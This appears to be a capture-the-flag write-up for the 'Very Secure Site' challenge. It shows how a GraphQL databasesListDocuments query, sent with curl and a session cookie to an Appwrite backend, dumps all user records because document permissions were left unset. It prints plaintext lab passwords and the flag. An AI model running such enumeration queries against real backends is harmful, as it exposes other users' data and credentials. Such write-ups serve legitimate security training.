# Very Secure Site
It's a simple login form, that takes you to a logout page.

The site uses obfuscated JS, but can see that it's sending some GraphQL requests with X-Appwrite headers. 

The site gets the user description on `/dashboard` with this query:
```
query { databasesGetDocument ( databaseId:"usersdb", collectionId:"usersc", documentId:"663a4d0c0031f4e6edc0" ) {data} }
```

You can use the [docs](https://appwrite.io/docs/references/cloud/client-web) to find the `databasesListDocuments` function and get the other users:

```sh
$ curl "https://cloud.appwrite.io/v1/graphql" -H "X-Appwrite-Project: 6622dcf123e47665c626" -H "Cookie: a_session_6622dcf123e47665c626=[session]" -H "content-type:application/graphql" --data 'query { databasesListDocuments ( databaseId:"usersdb", collectionId:"usersc" ) {documents {data} } }' | jq
{
  "data": {
    "databasesListDocuments": {
      "documents": [
        {
          "data": "{\"username\":\"anonUser\",\"isAdmin\":false,\"password\":\"p4ssw0rd\",\"about\":\"TODO: add stuff here\",\"$permissions\":null}"
        },
        {
          "data": "{\"username\":\"mali_ivica\",\"isAdmin\":true,\"password\":\"l0z1nkaaa\",\"about\":\"Mali Ivica je zaboravio omogu\\u0107iti document security. Nemojte biti kao Mali Ivica\\n\\nSTEM24{why_4r3_th3re_gr4phs_1n_my_ql_84612739}\",\"$permissions\":null}"
        },
        {
          "data": "{\"username\":\"mirko\",\"isAdmin\":false,\"password\":\"very_secure_password_123\",\"about\":\"Hey now, you're an all star\\nGet your game on, go play\\n\\nHey now, you're a rock star\\nGet the show on, get paid\\n\\nAnd all that glitters is gold\\nOnly shootin' stars break the mold\",\"$permissions\":null}"
        }
      ]
    }
  }
}
```

and get the flag from the user `mali_ivica`:
```
STEM24{why_4r3_th3re_gr4phs_1n_my_ql_84612739}
```

